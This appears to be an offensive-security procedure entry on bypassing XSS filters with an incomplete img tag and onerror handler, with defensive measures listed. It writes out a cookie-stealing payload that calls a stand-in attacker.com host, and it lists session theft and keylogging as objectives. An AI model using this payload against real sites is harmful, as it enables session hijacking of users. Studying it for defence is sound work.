---
id: f296e1af-922d-4985-a0a2-d9c4a9262b09
name: Bypass-XSS-Filter-with-Incomplete-HTML-Tag
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.401403+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Bypass with incomplete html tag]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Filter Bypass and exotic payloads]]'
  - xss
  - filter-bypass
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Bypass-XSS-Filter-with-Incomplete-HTML-Tag

## Summary

This procedure demonstrates how to bypass web application input filters designed to prevent Cross-Site Scripting (XSS) attacks by using an incomplete HTML tag. The technique exploits filters that only validate complete HTML tags, allowing injection of malicious JavaScript code to execute in the victim's browser, such as displaying an alert or stealing session data.

## Description

Filter Bypass with Incomplete HTML Tag targets web applications with inadequate input sanitization, particularly those that strip or block complete HTML tags like <script> but fail to handle malformed or incomplete tags. By injecting a payload like an <img> tag with an onerror event that ends abruptly (e.g., with a trailing <), the filter may not recognize it as a complete tag and allow it through. Once rendered, the browser executes the JavaScript in the onerror handler.

This is commonly used in reflected or stored XSS scenarios against user input fields, search boxes, or comment sections. From an offensive standpoint, it enables theft of cookies, session tokens, or keystrokes, or redirection to phishing sites. Defensively, it highlights the need for robust encoding and context-aware filtering. The technique assumes the application reflects input without proper HTML entity encoding and maps to JavaScript execution in the MITRE ATT&CK framework.

## Requirements

1. Access to a web application with a reflected or stored input field vulnerable to XSS.
2. Knowledge of the input filter's behavior (e.g., via testing basic payloads like <script>alert(1)</script>).
3. A browser or proxy tool like Burp Suite to intercept and modify requests (optional but recommended for testing).
4. Target application must render user input as HTML without proper escaping.

## Defense

Defensive measures and detection strategies:

- Implement comprehensive input validation and output encoding using libraries like OWASP ESAPI or DOMPurify to handle malformed tags.
- Deploy Content Security Policy (CSP) headers to block inline JavaScript execution and restrict script sources.
- Use Web Application Firewalls (WAFs) with rules for detecting event handlers like onerror and incomplete tags.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) or monitor for anomalous JavaScript execution via client-side logging.
- Regularly scan for XSS vulnerabilities using tools like OWASP ZAP or Burp Suite Scanner.

## Objectives

1. Bypass the application's XSS filter to inject and execute arbitrary JavaScript in the victim's browser.
2. Demonstrate proof-of-concept execution, such as triggering an alert box.
3. Collect sensitive data like cookies or session tokens for further exploitation.
4. Escalate to actions like keylogging or unauthorized requests on behalf of the victim.

## Instructions

### Step 1: Identify Vulnerable Input Field

**Context**: Locate an input point in the web application where user-supplied data is reflected back without proper sanitization, such as a search box, profile field, or comment form. Test with a basic XSS payload to confirm filter presence.

**Why**: This verifies the endpoint is injectable and identifies the filter's limitations (e.g., blocks <script> but allows attributes).

Enter a simple payload like `<script>alert(1)</script>` into the input and submit. If blocked, proceed to bypass testing.

**Expected Output**: If vulnerable without bypass, an alert box pops up; if filtered, no execution or sanitized output.

### Step 2: Craft and Test Incomplete HTML Tag Payload

**Context**: Use an incomplete <img> tag with an onerror event to inject JavaScript. The trailing < confuses simplistic filters that expect complete tags.

**Why**: Filters often parse for opening and closing tags; an incomplete structure slips through while the browser still executes the event handler when the src fails to load.

Inject the payload from the referenced code snippet into the input field:

Reference the payload: [[codes/Incomplete-HTML-Tag-XSS-Payload]]

Submit the form or trigger reflection.

If using a proxy, intercept the request, modify the parameter with the payload, and forward.

**Expected Output**: Upon page load, the browser attempts to load src='1' (which fails), triggering onerror and executing alert(0), displaying a popup.

**Success Indicators**:
- Alert box appears without the filter blocking the input.
- Page source shows the incomplete tag reflected but not sanitized.

### Step 3: Escalate the Payload for Data Exfiltration

**Context**: Once basic execution is confirmed, replace the alert with a more malicious payload, such as sending document.cookie to an attacker-controlled server.

**Why**: Proves the bypass enables real impact, like session hijacking.

Modify the onerror to: `onerror='fetch("http://attacker.com?cookie="+document.cookie)'` within the incomplete tag structure.

Submit and observe network requests or server logs.

**Expected Output**: A network request to the attacker's endpoint containing the victim's cookies.

**Success Indicators**:
- Data received on attacker server.
- No client-side errors or blocks during execution.
